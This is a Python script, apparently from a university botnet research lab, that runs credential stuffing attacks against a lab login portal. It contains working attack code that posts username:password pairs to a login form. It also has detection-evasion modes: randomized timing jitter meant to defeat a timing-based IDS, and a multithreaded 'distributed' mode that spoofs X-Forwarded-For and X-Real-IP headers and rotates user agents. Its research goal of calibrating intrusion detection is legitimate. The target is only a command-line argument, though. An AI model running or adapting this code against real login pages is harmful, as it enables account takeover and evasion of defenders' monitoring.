"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Credential Stuffing Attack Module
 Target: fake_portal.py running on 192.168.100.20:80
 Environment: ISOLATED VM LAB ONLY
====================================================

Credential stuffing attacks a web application using
leaked username:password pairs. Unlike brute-force
(many passwords per account), credential stuffing
tests one pair per account, exploiting password reuse.

This script is the ATTACKER side of the research.
The IDS (ids_detector.py Engine 2) monitors for:
  - Rigid inter-arrival timing (low CV)
  - High login volume from one IP

Three modes to test IDS evasion:
  1) BOT mode: rigid timing (easy to detect)
  2) JITTER mode: randomized delays (harder to detect)
  3) DISTRIBUTED mode: simulate multiple source IPs (hardest)

Research question: At what jitter level does CV-based
detection fail? (Answer: ~500ms stddev — see Graph 3)
"""

import os
import sys
import time
import json
import random
import socket
import urllib.request
import urllib.parse
import urllib.error
import threading
import statistics
import hashlib
from datetime import datetime

# ── Configuration ─────────────────────────────────────────────
TARGET_HOST   = "192.168.100.20"
TARGET_PORT   = 80
LOGIN_PATH    = "/login"
ATTEMPTS_PATH = "/attempts"

# ── Default credential list ───────────────────────────────────
# Based on leaked credential formats (anonymized/fake for research)
# In real credential stuffing: use combo lists from data breaches

DEFAULT_CREDS = [
    ("alice@example.com",  "password123"),
    ("alice@example.com",  "qwerty"),
    ("alice@example.com",  "letmein"),
    ("bob@example.com",    "123456"),
    ("bob@example.com",    "password"),
    ("bob@example.com",    "iloveyou"),
    ("charlie@corp.com",   "charlie2024"),
    ("charlie@corp.com",   "Summer2023!"),
    ("dave@mail.com",      "dave1234"),
    ("dave@mail.com",      "monkey"),
    ("eve@email.com",      "sunshine"),
    ("eve@email.com",      "princess"),
    ("frank@net.com",      "dragon"),
    ("frank@net.com",      "master"),
    ("grace@web.io",       "superman"),
    ("grace@web.io",       "batman"),
    ("admin@example.com",  "admin"),
    ("admin@example.com",  "admin123"),
    ("admin@example.com",  "password"),
    ("admin@example.com",  "securePass123!"),  # this one succeeds on fake_portal
    ("user@example.com",   "user"),
    ("user@example.com",   "password1"),
    ("test@test.com",      "test"),
    ("test@test.com",      "test123"),
    ("info@company.com",   "info2024"),
    ("support@app.com",    "support"),
    ("root@server.com",    "root"),
    ("root@server.com",    "toor"),
    ("john.doe@corp.com",  "John2024"),
    ("jane.doe@corp.com",  "Jane2024"),
]


# ── HTTP helpers ──────────────────────────────────────────────

def post_login(host: str, port: int, email: str, password: str,
               timeout: float = 5.0) -> tuple[int, str]:
    """
    HTTP POST to /login with form data.
    Returns (status_code, response_body).
    """
    body   = urllib.parse.urlencode({"email": email, "password": password}).encode()
    url    = f"http://{host}:{port}{LOGIN_PATH}"
    req    = urllib.request.Request(
        url, data=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (compatible; Research/1.0)",
        }
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)


def get_portal_stats(host: str, port: int) -> dict:
    """Fetch login attempt statistics from the portal's /attempts endpoint."""
    try:
        url = f"http://{host}:{port}{ATTEMPTS_PATH}"
        with urllib.request.urlopen(url, timeout=5) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return {}


# ── Timing analysis (mirrors IDS Engine 2 logic) ─────────────

def compute_cv(timestamps: list[float]) -> float:
    """Compute Coefficient of Variation of inter-arrival times."""
    if len(timestamps) < 3:
        return float('inf')
    intervals = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
    mean = statistics.mean(intervals)
    if mean == 0:
        return 0.0
    return statistics.stdev(intervals) / mean


def show_timing_analysis(timestamps: list[float], mode: str):
    """Print CV analysis matching what the IDS sees."""
    if len(timestamps) < 3:
        return
    cv = compute_cv(timestamps)
    intervals = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
    mean_ms = statistics.mean(intervals) * 1000
    stdev_ms = statistics.stdev(intervals) * 1000 if len(intervals) > 1 else 0

    print(f"\n[CS] ─── Timing Analysis ({mode}) ───")
    print(f"[CS]   Requests analyzed: {len(timestamps)}")
    print(f"[CS]   Mean inter-arrival: {mean_ms:.1f}ms")
    print(f"[CS]   Std deviation:      {stdev_ms:.1f}ms")
    print(f"[CS]   CV = {cv:.4f}  (IDS threshold: 0.15)")
    if cv < 0.15:
        print(f"[CS]   → DETECTABLE: CV below threshold — IDS would fire ✓")
    elif cv < 0.4:
        print(f"[CS]   → BORDERLINE: IDS may fire depending on window size")
    else:
        print(f"[CS]   → EVASIVE: CV too high — IDS treats as human traffic ✓")


# ── Attack modes ──────────────────────────────────────────────

class CredentialStuffer:
    """
    Automated credential stuffing attacker.

    Three modes:
      'bot'         — fixed interval, easily detected (CV ≈ 0.01)
      'jitter'      — randomized delays, borderline detection
      'distributed' — simulates multiple IPs via X-Forwarded-For header
    """

    def __init__(self, host: str = TARGET_HOST, port: int = TARGET_PORT,
                 creds: list = None, mode: str = "bot",
                 base_interval_ms: int = 500, jitter_ms: int = 0,
                 n_workers: int = 1):
        self.host             = host
        self.port             = port
        self.creds            = creds or DEFAULT_CREDS
        self.mode             = mode
        self.base_interval_ms = base_interval_ms
        self.jitter_ms        = jitter_ms
        self.n_workers        = n_workers

        self.results     = []   # (email, password, status, success, ts)
        self.timestamps  = []   # for CV analysis
        self.successes   = []
        self._lock       = threading.Lock()
        self._stop       = threading.Event()

    def _sleep_between_requests(self):
        """Sleep with configurable jitter."""
        if self.jitter_ms == 0:
            # Pure bot: fixed interval
            time.sleep(self.base_interval_ms / 1000.0)
        else:
            # Jittered: uniform random ±jitter_ms around base
            delay = self.base_interval_ms + random.uniform(-self.jitter_ms, self.jitter_ms)
            delay = max(50, delay)  # minimum 50ms
            time.sleep(delay / 1000.0)

    def _make_fake_ip(self) -> str:
        """Generate a fake source IP for distributed mode header spoofing."""
        # Use realistic-looking residential IP ranges
        ranges = [
            (10, 0, 0, 0),    # RFC1918 (lab range)
            (172, 16, 0, 0),  # RFC1918
        ]
        base = random.choice(ranges)
        return f"{base[0]}.{base[1]}.{random.randint(1,254)}.{random.randint(1,254)}"

    def _attempt(self, email: str, password: str, worker_id: int = 0):
        """Perform a single login attempt."""
        ts = time.time()

        if self.mode == "distributed":
            # Spoof X-Forwarded-For to simulate different source IPs
            fake_ip = self._make_fake_ip()
            body = urllib.parse.urlencode({"email": email, "password": password}).encode()
            url  = f"http://{self.host}:{self.port}{LOGIN_PATH}"
            req  = urllib.request.Request(url, data=body, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; rv:{random.randint(90,120)}.0)",
                "X-Forwarded-For": fake_ip,
                "X-Real-IP": fake_ip,
            })
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    status, body_resp = resp.status, resp.read().decode()
            except urllib.error.HTTPError as e:
                status, body_resp = e.code, ""
            except Exception:
                status, body_resp = 0, ""
        else:
            status, body_resp = post_login(self.host, self.port, email, password)

        success = status == 200 and "success" in body_resp.lower()

        with self._lock:
            self.timestamps.append(ts)
            self.results.append((email, password, status, success, ts))
            if success:
                self.successes.append((email, password))

        symbol = "✓" if success else "✗"
        print(f"[CS-{worker_id}] {symbol} {email}:{password}  → HTTP {status}")

        return success

    def run_sequential(self, verbose: bool = True):
        """Run credential stuffing sequentially (single source IP)."""
        print(f"\n[CS] Starting sequential attack ({self.mode} mode)")
        print(f"[CS] Target: {self.host}:{self.port}{LOGIN_PATH}")
        print(f"[CS] Credentials: {len(self.creds)} pairs")
        print(f"[CS] Interval: {self.base_interval_ms}ms ±{self.jitter_ms}ms")
        print()

        for i, (email, password) in enumerate(self.creds):
            if self._stop.is_set():
                break
            self._attempt(email, password)
            self._sleep_between_requests()

            # Periodic CV display
            if len(self.timestamps) > 0 and len(self.timestamps) % 10 == 0:
                show_timing_analysis(self.timestamps[-20:], self.mode)

        self._print_summary()

    def run_distributed(self, requests_per_second: float = 2.0):
        """
        Distributed mode: multiple threads hammering from different fake IPs.
        Each thread processes a partition of the credential list.
        """
        print(f"\n[CS] Starting DISTRIBUTED attack")
        print(f"[CS] Workers: {self.n_workers}  |  Target RPS: {requests_per_second}")

        chunk_size = max(1, len(self.creds) // self.n_workers)
        threads    = []
        interval_ms = int(1000.0 / requests_per_second / self.n_workers)

        for w in range(self.n_workers):
            chunk = self.creds[w * chunk_size:(w + 1) * chunk_size]

            def worker(creds_chunk, wid):
                for email, password in creds_chunk:
                    if self._stop.is_set():
                        break
                    self._attempt(email, password, worker_id=wid)
                    delay = interval_ms + random.uniform(-50, 50)
                    time.sleep(max(10, delay) / 1000.0)

            t = threading.Thread(target=worker, args=(chunk, w), daemon=True)
            threads.append(t)

        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self._print_summary()

    def stop(self):
        self._stop.set()

    def _print_summary(self):
        print(f"\n[CS] {'='*50}")
        print(f"[CS] Attack Summary")
        print(f"[CS] {'='*50}")
        print(f"[CS] Total attempts: {len(self.results)}")
        print(f"[CS] Successful logins: {len(self.successes)}")
        if self.successes:
            print(f"[CS] Valid credentials found:")
            for email, pwd in self.successes:
                print(f"[CS]   ✓ {email} : {pwd}")

        if len(self.timestamps) >= 3:
            show_timing_analysis(self.timestamps, self.mode)

        # Fetch portal stats for comparison
        stats = get_portal_stats(self.host, self.port)
        if stats:
            print(f"\n[CS] Portal reports: {stats.get('total_attempts')} total attempts, "
                  f"{stats.get('success_count')} successes")


# ── Human simulation (baseline for comparison) ────────────────

def simulate_human_baseline(host: str = TARGET_HOST, port: int = TARGET_PORT,
                             n_attempts: int = 20):
    """
    Simulate a real human user logging in with natural timing.
    Shows what HIGH CV looks like — the IDS should NOT fire.
    Used to calibrate Graph 3 (FPR baseline).
    """
    print(f"\n[CS] Simulating human baseline ({n_attempts} attempts)")
    print(f"[CS] Human timing: Gaussian distribution μ=3s σ=2.5s")

    timestamps = []
    successes  = 0

    emails  = ["alice@example.com", "bob@example.com", "admin@example.com"]
    passwds = ["wrong_pass", "another_wrong", "password123"]

    for i in range(n_attempts):
        # Human typing speed: Gaussian around 3 seconds, high variance
        delay = abs(random.gauss(3.0, 2.5))
        delay = max(0.5, delay)
        time.sleep(delay)

        email, password = random.choice(list(zip(emails, passwds)))
        status, body = post_login(host, port, email, password)
        ts = time.time()
        timestamps.append(ts)

        success = status == 200
        if success:
            successes += 1
        print(f"[HUMAN] {'✓' if success else '✗'} {email}  delay={delay:.2f}s")

    show_timing_analysis(timestamps, "human_baseline")
    print(f"\n[HUMAN] A well-calibrated IDS should NOT have fired on this traffic.")


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Credential Stuffing Module - AUA Botnet Research Lab"
    )
    parser.add_argument("--mode",
                        choices=["bot", "jitter", "distributed", "human"],
                        default="bot",
                        help="Attack mode (default: bot)")
    parser.add_argument("--interval",  type=int,   default=500,
                        help="Base interval between requests in ms (default: 500)")
    parser.add_argument("--jitter",    type=int,   default=0,
                        help="Jitter ±ms (0=none, try 100/300/500/1000 for Graph 3)")
    parser.add_argument("--workers",   type=int,   default=3,
                        help="Worker threads for distributed mode (default: 3)")
    parser.add_argument("--host",      default=TARGET_HOST,
                        help=f"Target host (default: {TARGET_HOST})")
    parser.add_argument("--port",      type=int,   default=TARGET_PORT,
                        help=f"Target port (default: {TARGET_PORT})")
    args = parser.parse_args()

    print("=" * 60)
    print(" Credential Stuffing Module - AUA Botnet Research Lab")
    print(" ISOLATED ENVIRONMENT ONLY")
    print("=" * 60)

    # Quick connectivity check
    try:
        s = socket.create_connection((args.host, args.port), timeout=3)
        s.close()
        print(f"[CS] Target {args.host}:{args.port} reachable ✓\n")
    except Exception:
        print(f"[CS] ERROR: Cannot reach {args.host}:{args.port}")
        print(f"[CS] Make sure fake_portal.py is running on the victim VM")
        sys.exit(1)

    if args.mode == "human":
        simulate_human_baseline(args.host, args.port, n_attempts=15)

    elif args.mode == "distributed":
        stuffer = CredentialStuffer(
            host=args.host, port=args.port,
            mode="distributed",
            base_interval_ms=args.interval,
            jitter_ms=args.jitter,
            n_workers=args.workers
        )
        stuffer.run_distributed(requests_per_second=4.0)

    else:
        # bot or jitter mode
        jitter = 0 if args.mode == "bot" else (args.jitter or 200)
        stuffer = CredentialStuffer(
            host=args.host, port=args.port,
            mode=args.mode,
            base_interval_ms=args.interval,
            jitter_ms=jitter
        )
        stuffer.run_sequential()

    print(f"\n[CS] Done. Review IDS logs on victim VM to see detection results.")
    print(f"[CS] Graph 3 tip: re-run with --jitter 0,100,300,500,750,1000 and record CV + detection.")
